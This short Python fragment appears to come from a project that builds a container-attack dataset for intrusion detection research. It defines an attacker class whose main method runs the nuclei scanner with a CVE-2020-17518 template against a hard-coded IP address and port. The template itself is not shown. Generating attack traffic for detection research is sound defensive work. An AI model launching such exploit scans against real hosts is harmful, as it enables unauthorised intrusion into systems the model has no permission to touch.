...
class PT_CVE_2020_17518_Attacker1(AttackerBase):
    ...
    def main(self):
        ...
        self.commandRunner.runCommand('nuclei -u http://144.122.71.18:30006 -t ~/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/YAMLs/CVE-2020-17518.yaml')
